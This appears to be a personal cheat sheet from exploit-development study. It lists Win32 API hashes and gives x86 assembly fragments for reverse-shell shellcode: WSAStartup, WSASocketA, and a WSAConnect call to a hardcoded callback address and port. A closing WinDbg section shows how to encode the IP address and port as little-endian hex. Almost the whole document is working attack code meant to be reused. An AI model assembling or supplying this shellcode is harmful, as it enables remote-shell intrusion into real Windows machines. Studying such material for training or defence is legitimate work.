# Win32 Functions




### CreateProcessA
**hash**
`0x16b3fe72`  

### LoadLibararyA
**hash**
`0xec0e4e8e`

### TerminateProcess
**hash**
`0x78b5b983`

### WSAStartup
**hash**
`0x3bfcedcb`

**code**
```
    " call_wsastartup:                   "  #
    "   mov   eax, esp                  ;"  #   Move ESP to EAX
    "   mov   cx, 0x590                 ;"  #   Move 0x590 to CX
    "   sub   eax, ecx                  ;"  #   Subtract CX from EAX to avoid overwriting the structure later
    "   push  eax                       ;"  #   Push lpWSAData
    "   xor   eax, eax                  ;"  #   Null EAX
    "   mov   ax, 0x0202                ;"  #   Move version to AX
    "   push  eax                       ;"  #   Push wVersionRequired
    "   call dword ptr [ebp+0x1C]       ;"  #   Call WSAStartup at ebp_+0x1c - change as necessary
```

### WSASocketA
**hash**
`0xadf509d9`

**code**
```
    " call_wsasocketa:                   "  #
    "   xor   eax, eax                  ;"  #   Null EAX
    "   push  eax                       ;"  #   Push dwFlags
    "   push  eax                       ;"  #   Push g
    "   push  eax                       ;"  #   Push lpProtocolInfo
    "   mov   al, 0x06                  ;"  #   Move AL, IPPROTO_TCP
    "   push  eax                       ;"  #   Push protocol
    "   sub   al, 0x05                  ;"  #   Subtract 0x05 from AL, AL = 0x01
    "   push  eax                       ;"  #   Push type
    "   inc   eax                       ;"  #   Increase EAX, EAX = 0x02
    "   push  eax                       ;"  #   Push af
    "   call dword ptr [ebp+0x20]       ;"  #   Call WSASocketA at ebp+0x20 - change as necessary
```

### WSAConnect
**hash**
`0xb32dba0c`

```
   " call_wsaconnect:                   "  #
    "   mov   esi, eax                  ;"  #   Move the SOCKET descriptor to ESI
    "   xor   eax, eax                  ;"  #   Null EAX
    "   push  eax                       ;"  #   Push sin_zero[]
    "   push  eax                       ;"  #   Push sin_zero[]
    "   push  0xe62da8c0                ;"  #   Push sin_addr (192.168.45.230) - change as necessary
    "   mov   ax, 0xb822                ;"  #   Move the sin_port (8888) to AX - change as necessary
    "   shl   eax, 0x10                 ;"  #   Left shift EAX by 0x10 bits
    "   add   ax, 0x02                  ;"  #   Add 0x02 (AF_INET) to AX
    "   push  eax                       ;"  #   Push sin_port & sin_family
    "   push  esp                       ;"  #   Push pointer to the sockaddr_in structure
    "   pop   edi                       ;"  #   Store pointer to sockaddr_in in EDI
    "   xor   eax, eax                  ;"  #   Null EAX
    "   push  eax                       ;"  #   Push lpGQOS
    "   push  eax                       ;"  #   Push lpSQOS
    "   push  eax                       ;"  #   Push lpCalleeData
    "   push  eax                       ;"  #   Push lpCallerData
    "   add   al, 0x10                  ;"  #   Set AL to 0x10
    "   push  eax                       ;"  #   Push namelen
    "   push  edi                       ;"  #   Push *name
    "   push  esi                       ;"  #   Push s
    "   call dword ptr [ebp+0x24]       ;"  #   Call WSAConnect at ebp+0x24 - change as necessary
```
**IP address and port conversion to hex**
```
# using windbg
>? 0n192
Evaluate expression: 192 = 000000c0
>? 0n168
Evaluate expression: 168 = 000000a8
>? 0n45
Evaluate expression: 45 = 0000002d
>? 0n230
Evaluate expression: 230 = 000000e6

# combine the conversions using little endian
0xe62da8c0

# for the port
>? 0n8888
Evaluate expression: 8888 = 000022b8

# convert to little endian
0xb822
```
